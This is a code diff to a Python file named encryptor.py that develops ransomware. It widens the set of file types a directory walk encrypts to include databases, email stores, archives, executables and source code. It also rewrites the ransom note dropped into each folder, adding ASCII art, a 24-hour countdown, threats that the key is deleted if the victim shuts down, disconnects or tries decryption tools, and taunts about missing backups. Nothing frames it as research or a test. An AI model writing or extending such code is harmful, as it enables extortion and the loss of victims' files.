@@ -1,6 +1,3 @@
-## src/encryptor.py
-
-```python
 import os
 import random
 import string
@@ -32,7 +29,11 @@ class FileEncryptor:
     
     def encrypt_directory(self, directory_path, extensions=None):
         if extensions is None:
-            extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', '.xls', '.xlsx', '.ppt', '.pptx']
+            extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', 
+                         '.xls', '.xlsx', '.ppt', '.pptx', '.csv', '.zip', '.rar', '.7z',
+                         '.iso', '.exe', '.dll', '.sql', '.db', '.mdb', '.accdb', '.pst',
+                         '.ost', '.msg', '.eml', '.xml', '.json', '.html', '.htm', '.php',
+                         '.js', '.css', '.cpp', '.c', '.java', '.py', '.rb', '.go', '.rs']
         
         for root, _, files in os.walk(directory_path):
             for file in files:
@@ -41,27 +42,50 @@ class FileEncryptor:
                     self.encrypt_file(file_path)
     
     def create_ransom_note(self, directory_path):
+        skull_art = """
+    ╔════════════════════════════════════════════════════════════════╗
+    ║                                                              ║
+    ║    ██████╗ ██╗   ██╗ ██████╗ ██████╗ ██╗███╗   ██╗███████╗    ║
+    ║    ██╔══██╗██║   ██║██╔════╝██╔═══██╗██║████╗  ██║██╔════╝    ║
+    ║    ██████╔╝██║   ██║██║     ██║   ██║██║██╔██╗ ██║█████╗      ║
+    ║    ██╔══██╗██║   ██║██║     ██║   ██║██║██║╚██╗██║██╔══╝      ║
+    ║    ██║  ██║╚██████╔╝╚██████╗╚██████╔╝██║██║ ╚████║███████╗    ║
+    ║    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝    ║
+    ║                                                              ║
+    ║            YOUR FILES HAVE BEEN ENCRYPTED!                   ║
+    ║                                                              ║
+    ╚════════════════════════════════════════════════════════════════╝
+        """
+        
         note_content = f"""
-YOUR FILES HAVE BEEN ENCRYPTED!
+{skull_art}
 
 All your important files have been encrypted with military-grade AES-256 encryption.
-Your documents, photos, videos, and other files are now inaccessible.
+Your documents, photos, videos, databases, and other files are now inaccessible.
 
-To decrypt your files, you need a special decryption key.
-Without this key, your files will remain encrypted forever.
+WHAT HAPPENED:
+- All your personal files have been encrypted
+- The encryption key is stored on a secure server
+- Your files will remain encrypted forever without the key
 
-The encryption key is stored securely and will be deleted if:
+THIS IS NOT A JOKE. THIS IS NOT A TEST.
+Your files are truly encrypted. This looks like a skill issue on your part.
+
+IF YOU WANT YOUR FILES BACK:
+1. Do NOT turn off or restart your computer
+2. Do NOT try to decrypt the files yourself
+3. Do NOT delete any files
+4. Wait for further instructions
+
+The encryption key will be permanently deleted if:
 - You try to use any decryption tools
 - You shut down your computer
 - You try to modify the encrypted files
+- You disconnect from the internet
 
-IF YOU WANT YOUR FILES BACK:
-1. Do not turn off or restart your computer
-2. Do not try to decrypt the files yourself
-3. Wait for further instructions
+Time remaining before permanent deletion: 24:00:00
 
-This is not a joke. Your files are truly encrypted.
-This looks like a skill issue on your part - maybe next time you'll have proper backups.
+This is your only warning. Next time, maybe you'll have proper backups.
 """
         
         note_path = os.path.join(directory_path, "FILES_ENCRYPTED.txt")
